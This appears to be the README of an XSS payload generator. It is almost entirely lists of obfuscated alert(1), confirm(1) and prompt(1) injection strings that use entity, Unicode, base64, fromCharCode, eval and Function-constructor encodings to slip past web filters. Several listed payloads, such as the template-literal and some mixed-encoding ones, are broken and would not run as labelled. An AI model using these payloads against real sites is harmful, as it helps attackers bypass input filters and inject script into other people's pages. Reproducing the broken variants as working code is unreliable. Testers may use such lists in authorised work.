# xss-payloads-generator
 
```
cat payloads.txt | python3 Decimal-Encoded-Payloads-Special-Characters.py
cat payloads.txt | python3 Decimal-Encoded-Payloads.py
cat payloads.txt | python3 Different-Event-Handlers.py
cat payloads.txt | python3 HTML-Entity-Encoding-Special-Characters.py
cat payloads.txt | python3 HTML-Entity-Encoding.py
cat payloads.txt | python3 HTML-Hexadecimal-Entity-Encoding-Special-Characters.py
cat payloads.txt | python3 HTML-Hexadecimal-Entity-Encoding.py
cat payloads.txt | python3 Unicode-Encoded-Payloads.py
cat payloads.txt | python3 String-Concatenation.py
cat payloads.txt | python3 Base64-Encoded-Payloads.py
cat payloads.txt | python3 URL-Encoded-Payloads.py
cat payloads.txt | python3 String-FromCharCode-Payloads.py
cat payloads.txt | python3 Template-Literal-Payloads.py
cat payloads.txt | python3 Variable-Obfuscation-Payloads.py
cat payloads.txt | python3 Function-Constructor-Payloads.py
cat payloads.txt | python3 Reverse-String-Payloads.py
cat payloads.txt | python3 Mixed-Encoding-Payloads.py
```

## alert(1)
```
bash main.sh
// Decimal-Encoded-Payloads
&#97;lert(1)
a&#108;ert(1)
al&#101;rt(1)
ale&#114;t(1)
aler&#116;(1)
&#97;&#108;&#101;&#114;&#116;(1)

// Decimal-Encoded-Payloads-Special-Characters
alert&#40;1&#41;

// HTML-Entity-Encoding
&#x61;lert(1)
a&#x6c;ert(1)
al&#x65;rt(1)
ale&#x72;t(1)
aler&#x74;(1)
&#x61;&#x6c;&#x65;&#x72;&#x74;(1)

// HTML-Entity-Encoding-Special-Characters
alert&#x28;1&#x29;

// HTML-Hexadecimal-Entity-Encoding
&#x000061;lert(1)
a&#x00006c;ert(1)
al&#x000065;rt(1)
ale&#x000072;t(1)
aler&#x000074;(1)
&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)

// HTML-Hexadecimal-Entity-Encoding-Special-Characters
alert&#x000028;1&#x000029;

// Unicode-Encoded-Payloads
\u0061lert(1)
a\u006cert(1)
al\u0065rt(1)
ale\u0072t(1)
aler\u0074(1)
\u0061\u006c\u0065\u0072\u0074(1)

// String-Concatenation
eval("a"+"lert(1)")
eval("al"+"ert(1)")
eval("ale"+"rt(1)")
eval("aler"+"t(1)")
eval("alert"+"(1)")
eval("a"+"l"+"e"+"r"+"t"+"(1)")

// Base64-Encoded-Payloads
eval(atob('YWxlcnQoMSk='))
eval(atob('YWxlcnQ=')+'(1)')
eval(atob('YWxlcnQ=')+atob('KDEp'))
eval(String.fromCharCode(...atob('YWxlcnQoMSk=').split('').map(c=>c.charCodeAt(0))))

// URL-Encoded-Payloads
eval(decodeURIComponent('alert%281%29'))
eval(decodeURIComponent('alert')+'(1)')
eval(decodeURIComponent('alert%281%29'))
eval(decodeURIComponent('alert')+'(1)')
eval(decodeURIComponent('alert%28%31%29'))

// String-FromCharCode-Payloads
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
eval(String.fromCharCode(97,108,101,114,116)+'(1)')
eval(String.fromCharCode(...[97,108,101,114,116])+'(1)')
eval(String.fromCharCode(...Array.from([97,108,101,114,116,40,49,41])))
eval(String.fromCharCode(97)+'lert(1)')
eval(String.fromCharCode(97,108)+'ert(1)')
eval(String.fromCharCode(97,108,101)+'rt(1)')
eval(String.fromCharCode(97,108,101,114)+'t(1)')
eval(String.fromCharCode(...[97,108,101,114,116,40,49,41].map(x=>x)))

// Template-Literal-Payloads
eval(`$alert$(1)`)
eval(`${'a'+'l'+'e'+'r'+'t'}$(1)`)
eval(`${String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)}$(1)`)
eval(`${['a','l','e','r','t'].join('')}$(1)`)
eval(`${`${'a'}`+`${'lert'}`}$(1)`)
eval(`${'alert'.split('').join('')}$(1)`)
eval(`${'alert'.split('').reverse().reverse().join('')}$(1)`)

// Variable-Obfuscation-Payloads
var _0x='alert';eval(_0x+'(1)')
var _=['a','l','e','r','t'];eval(_.join('')+'(1)')
var _=String.fromCharCode(97,108,101,114,116);eval(_+'(1)')
var _='alert'.split('');eval(_.join('')+'(1)')
var _='trela'.split('').reverse().join('');eval(_+'(1)')
var _0='a';var _1='l';var _2='e';var _3='r';var _4='t';eval(_0+_1+_2+_3+_4+'(1)')
var _=atob('YWxlcnQ=');eval(_+'(1)')
var _=decodeURIComponent('alert');eval(_+'(1)')
var _='alert';eval(_.slice(0)+'(1)')
var _='alert';eval(_.substring(0)+'(1)')

// Function-Constructor-Payloads
new Function('alert(1)')()
new Function('return alert(1)')()
new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()
new Function(String.fromCharCode(97,108,101,114,116)+'(1)')()
new Function('eval','alert(1)')()
new Function(atob('YWxlcnQoMSk='))()
new Function(decodeURIComponent('alert%281%29'))()
new Function(`alert(1)`)()
new Function(['a','l','e','r','t','(','1',')'].join(''))()

// Reverse-String-Payloads
eval('trela'.split('').reverse().join('')+'(1)')
eval([...'trela'].reverse().join('')+'(1)')
eval(Array.from('trela').reverse().join('')+'(1)')
eval('trela'.split('').slice().reverse().join('')+'(1)')
eval(['t','r','e','l','a'].reverse().join('')+'(1)')
eval('trela'.split('').map(x=>x).reverse().join('')+'(1)')
eval('trela'.split('').reduce((a,b)=>b+a,'')+'(1)')
eval('alert'.split('').reverse().reverse().join('')+'(1)')

// Mixed-Encoding-Payloads
eval('\u0061\u006c'+String.fromCharCode(101,114,116)+'(1)')
eval(atob('YWxlcnQ=')+decodeURIComponent('%281%29'))
eval('&#x61;&#x6c;\u0065\u0072\u0074(1)')
eval(String.fromCharCode(97,108,101,114,116)+`(1)`)
eval(atob('YWxlcnQ=')+String.fromCharCode(40,49,41))
eval(String.fromCharCode(116,114)+'ela'.split('').reverse().join('')+'(1)')
eval(decodeURIComponent('alert')+`(1)`)
var _=atob('YWxlcnQ=');eval(_+String.fromCharCode(40,49,41))
eval(String.fromCharCode(...atob(decodeURIComponent('YWxlcnQ%3D')).split('').map(c=>c.charCodeAt(0)))+'(1)')
```

## confirm(1)
```
bash main.sh
// Decimal-Encoded-Payloads
&#99;onfirm(1)
c&#111;nfirm(1)
co&#110;firm(1)
con&#102;irm(1)
conf&#105;rm(1)
confi&#114;m(1)
confir&#109;(1)
&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)

// Decimal-Encoded-Payloads-Special-Characters
confirm&#40;1&#41;

// HTML-Entity-Encoding
&#x63;onfirm(1)
c&#x6f;nfirm(1)
co&#x6e;firm(1)
con&#x66;irm(1)
conf&#x69;rm(1)
confi&#x72;m(1)
confir&#x6d;(1)
&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)

// HTML-Entity-Encoding-Special-Characters
confirm&#x28;1&#x29;

// HTML-Hexadecimal-Entity-Encoding
&#x000063;onfirm(1)
c&#x00006f;nfirm(1)
co&#x00006e;firm(1)
con&#x000066;irm(1)
conf&#x000069;rm(1)
confi&#x000072;m(1)
confir&#x00006d;(1)
&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)

// HTML-Hexadecimal-Entity-Encoding-Special-Characters
confirm&#x000028;1&#x000029;

// Unicode-Encoded-Payloads
\u0063onfirm(1)
c\u006fnfirm(1)
co\u006efirm(1)
con\u0066irm(1)
conf\u0069rm(1)
confi\u0072m(1)
confir\u006d(1)
\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)

// String-Concatenation
eval("c"+"onfirm(1)")
eval("co"+"nfirm(1)")
eval("con"+"firm(1)")
eval("conf"+"irm(1)")
eval("confi"+"rm(1)")
eval("confir"+"m(1)")
eval("confirm"+"(1)")
eval("c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)")

// Base64-Encoded-Payloads
eval(atob('Y29uZmlybSgxKQ=='))
eval(atob('Y29uZmlybQ==')+'(1)')
eval(atob('Y29uZmlybQ==')+atob('KDEp'))
eval(String.fromCharCode(...atob('Y29uZmlybSgxKQ==').split('').map(c=>c.charCodeAt(0))))

// URL-Encoded-Payloads
eval(decodeURIComponent('confirm%281%29'))
eval(decodeURIComponent('confirm')+'(1)')
eval(decodeURIComponent('confirm%281%29'))
eval(decodeURIComponent('confirm')+'(1)')
eval(decodeURIComponent('confirm%28%31%29'))

// String-FromCharCode-Payloads
eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))
eval(String.fromCharCode(99,111,110,102,105,114,109)+'(1)')
eval(String.fromCharCode(...[99,111,110,102,105,114,109])+'(1)')
eval(String.fromCharCode(...Array.from([99,111,110,102,105,114,109,40,49,41])))
eval(String.fromCharCode(99)+'onfirm(1)')
eval(String.fromCharCode(99,111)+'nfirm(1)')
eval(String.fromCharCode(99,111,110)+'firm(1)')
eval(String.fromCharCode(99,111,110,102)+'irm(1)')
eval(String.fromCharCode(99,111,110,102,105)+'rm(1)')
eval(String.fromCharCode(99,111,110,102,105,114)+'m(1)')
eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,49,41].map(x=>x)))

// Template-Literal-Payloads
eval(`$confirm$(1)`)
eval(`${'c'+'o'+'n'+'f'+'i'+'r'+'m'}$(1)`)
eval(`${String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(110)+String.fromCharCode(102)+String.fromCharCode(105)+String.fromCharCode(114)+String.fromCharCode(109)}$(1)`)
eval(`${['c','o','n','f','i','r','m'].join('')}$(1)`)
eval(`${`${'c'}`+`${'onfirm'}`}$(1)`)
eval(`${'confirm'.split('').join('')}$(1)`)
eval(`${'confirm'.split('').reverse().reverse().join('')}$(1)`)

// Variable-Obfuscation-Payloads
var _0x='confirm';eval(_0x+'(1)')
var _=['c','o','n','f','i','r','m'];eval(_.join('')+'(1)')
var _=String.fromCharCode(99,111,110,102,105,114,109);eval(_+'(1)')
var _='confirm'.split('');eval(_.join('')+'(1)')
var _='mrifnoc'.split('').reverse().join('');eval(_+'(1)')
var _0='c';var _1='o';var _2='n';var _3='f';var _4='i';var _5='r';var _6='m';eval(_0+_1+_2+_3+_4+_5+_6+'(1)')
var _=atob('Y29uZmlybQ==');eval(_+'(1)')
var _=decodeURIComponent('confirm');eval(_+'(1)')
var _='confirm';eval(_.slice(0)+'(1)')
var _='confirm';eval(_.substring(0)+'(1)')

// Function-Constructor-Payloads
new Function('confirm(1)')()
new Function('return confirm(1)')()
new Function(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))()
new Function(String.fromCharCode(99,111,110,102,105,114,109)+'(1)')()
new Function('eval','confirm(1)')()
new Function(atob('Y29uZmlybSgxKQ=='))()
new Function(decodeURIComponent('confirm%281%29'))()
new Function(`confirm(1)`)()
new Function(['c','o','n','f','i','r','m','(','1',')'].join(''))()

// Reverse-String-Payloads
eval('mrifnoc'.split('').reverse().join('')+'(1)')
eval([...'mrifnoc'].reverse().join('')+'(1)')
eval(Array.from('mrifnoc').reverse().join('')+'(1)')
eval('mrifnoc'.split('').slice().reverse().join('')+'(1)')
eval(['m','r','i','f','n','o','c'].reverse().join('')+'(1)')
eval('mrifnoc'.split('').map(x=>x).reverse().join('')+'(1)')
eval('mrifnoc'.split('').reduce((a,b)=>b+a,'')+'(1)')
eval('confirm'.split('').reverse().reverse().join('')+'(1)')

// Mixed-Encoding-Payloads
eval('\u0063\u006f'+String.fromCharCode(110,102,105,114,109)+'(1)')
eval(atob('Y29uZmlybQ==')+decodeURIComponent('%281%29'))
eval('&#x63;&#x6f;\u006e\u0066\u0069\u0072\u006d(1)')
eval(String.fromCharCode(99,111,110,102,105,114,109)+`(1)`)
eval(atob('Y29uZmlybQ==')+String.fromCharCode(40,49,41))
eval(String.fromCharCode(109,114)+'ifnoc'.split('').reverse().join('')+'(1)')
eval(decodeURIComponent('confirm')+`(1)`)
var _=atob('Y29uZmlybQ==');eval(_+String.fromCharCode(40,49,41))
eval(String.fromCharCode(...atob(decodeURIComponent('Y29uZmlybQ%3D%3D')).split('').map(c=>c.charCodeAt(0)))+'(1)')
```

## prompt(1)
```
bash main.sh
// Decimal-Encoded-Payloads
&#112;rompt(1)
p&#114;ompt(1)
pr&#111;mpt(1)
pro&#109;pt(1)
prom&#112;t(1)
promp&#116;(1)
&#112;&#114;&#111;&#109;&#112;&#116;(1)

// Decimal-Encoded-Payloads-Special-Characters
prompt&#40;1&#41;

// HTML-Entity-Encoding
&#x70;rompt(1)
p&#x72;ompt(1)
pr&#x6f;mpt(1)
pro&#x6d;pt(1)
prom&#x70;t(1)
promp&#x74;(1)
&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)

// HTML-Entity-Encoding-Special-Characters
prompt&#x28;1&#x29;

// HTML-Hexadecimal-Entity-Encoding
&#x000070;rompt(1)
p&#x000072;ompt(1)
pr&#x00006f;mpt(1)
pro&#x00006d;pt(1)
prom&#x000070;t(1)
promp&#x000074;(1)
&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)

// HTML-Hexadecimal-Entity-Encoding-Special-Characters
prompt&#x000028;1&#x000029;

// Unicode-Encoded-Payloads
\u0070rompt(1)
p\u0072ompt(1)
pr\u006fmpt(1)
pro\u006dpt(1)
prom\u0070t(1)
promp\u0074(1)
\u0070\u0072\u006f\u006d\u0070\u0074(1)

// String-Concatenation
eval("p"+"rompt(1)")
eval("pr"+"ompt(1)")
eval("pro"+"mpt(1)")
eval("prom"+"pt(1)")
eval("promp"+"t(1)")
eval("prompt"+"(1)")
eval("p"+"r"+"o"+"m"+"p"+"t"+"(1)")

// Base64-Encoded-Payloads
eval(atob('cHJvbXB0KDEp'))
eval(atob('cHJvbXB0')+'(1)')
eval(atob('cHJvbXB0')+atob('KDEp'))
eval(String.fromCharCode(...atob('cHJvbXB0KDEp').split('').map(c=>c.charCodeAt(0))))

// URL-Encoded-Payloads
eval(decodeURIComponent('prompt%281%29'))
eval(decodeURIComponent('prompt')+'(1)')
eval(decodeURIComponent('prompt%281%29'))
eval(decodeURIComponent('prompt')+'(1)')
eval(decodeURIComponent('prompt%28%31%29'))

// String-FromCharCode-Payloads
eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))
eval(String.fromCharCode(112,114,111,109,112,116)+'(1)')
eval(String.fromCharCode(...[112,114,111,109,112,116])+'(1)')
eval(String.fromCharCode(...Array.from([112,114,111,109,112,116,40,49,41])))
eval(String.fromCharCode(112)+'rompt(1)')
eval(String.fromCharCode(112,114)+'ompt(1)')
eval(String.fromCharCode(112,114,111)+'mpt(1)')
eval(String.fromCharCode(112,114,111,109)+'pt(1)')
eval(String.fromCharCode(112,114,111,109,112)+'t(1)')
eval(String.fromCharCode(...[112,114,111,109,112,116,40,49,41].map(x=>x)))

// Template-Literal-Payloads
eval(`$prompt$(1)`)
eval(`${'p'+'r'+'o'+'m'+'p'+'t'}$(1)`)
eval(`${String.fromCharCode(112)+String.fromCharCode(114)+String.fromCharCode(111)+String.fromCharCode(109)+String.fromCharCode(112)+String.fromCharCode(116)}$(1)`)
eval(`${['p','r','o','m','p','t'].join('')}$(1)`)
eval(`${`${'p'}`+`${'rompt'}`}$(1)`)
eval(`${'prompt'.split('').join('')}$(1)`)
eval(`${'prompt'.split('').reverse().reverse().join('')}$(1)`)

// Variable-Obfuscation-Payloads
var _0x='prompt';eval(_0x+'(1)')
var _=['p','r','o','m','p','t'];eval(_.join('')+'(1)')
var _=String.fromCharCode(112,114,111,109,112,116);eval(_+'(1)')
var _='prompt'.split('');eval(_.join('')+'(1)')
var _='tpmorp'.split('').reverse().join('');eval(_+'(1)')
var _0='p';var _1='r';var _2='o';var _3='m';var _4='p';var _5='t';eval(_0+_1+_2+_3+_4+_5+'(1)')
var _=atob('cHJvbXB0');eval(_+'(1)')
var _=decodeURIComponent('prompt');eval(_+'(1)')
var _='prompt';eval(_.slice(0)+'(1)')
var _='prompt';eval(_.substring(0)+'(1)')

// Function-Constructor-Payloads
new Function('prompt(1)')()
new Function('return prompt(1)')()
new Function(String.fromCharCode(112,114,111,109,112,116,40,49,41))()
new Function(String.fromCharCode(112,114,111,109,112,116)+'(1)')()
new Function('eval','prompt(1)')()
new Function(atob('cHJvbXB0KDEp'))()
new Function(decodeURIComponent('prompt%281%29'))()
new Function(`prompt(1)`)()
new Function(['p','r','o','m','p','t','(','1',')'].join(''))()

// Reverse-String-Payloads
eval('tpmorp'.split('').reverse().join('')+'(1)')
eval([...'tpmorp'].reverse().join('')+'(1)')
eval(Array.from('tpmorp').reverse().join('')+'(1)')
eval('tpmorp'.split('').slice().reverse().join('')+'(1)')
eval(['t','p','m','o','r','p'].reverse().join('')+'(1)')
eval('tpmorp'.split('').map(x=>x).reverse().join('')+'(1)')
eval('tpmorp'.split('').reduce((a,b)=>b+a,'')+'(1)')
eval('prompt'.split('').reverse().reverse().join('')+'(1)')

// Mixed-Encoding-Payloads
eval('\u0070\u0072'+String.fromCharCode(111,109,112,116)+'(1)')
eval(atob('cHJvbXB0')+decodeURIComponent('%281%29'))
eval('&#x70;&#x72;\u006f\u006d\u0070\u0074(1)')
eval(String.fromCharCode(112,114,111,109,112,116)+`(1)`)
eval(atob('cHJvbXB0')+String.fromCharCode(40,49,41))
eval(String.fromCharCode(116,112)+'morp'.split('').reverse().join('')+'(1)')
eval(decodeURIComponent('prompt')+`(1)`)
var _=atob('cHJvbXB0');eval(_+String.fromCharCode(40,49,41))
eval(String.fromCharCode(...atob(decodeURIComponent('cHJvbXB0')).split('').map(c=>c.charCodeAt(0)))+'(1)')
```
